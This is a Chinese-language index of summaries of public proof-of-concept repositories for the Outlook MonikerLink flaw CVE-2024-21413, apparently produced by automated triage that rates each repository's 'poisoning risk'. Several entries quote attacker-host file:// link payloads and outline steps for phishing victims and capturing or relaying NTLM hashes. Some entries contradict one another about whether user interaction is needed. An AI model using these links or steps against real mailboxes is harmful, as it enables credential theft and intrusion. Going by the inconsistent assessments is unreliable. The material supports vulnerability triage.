**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
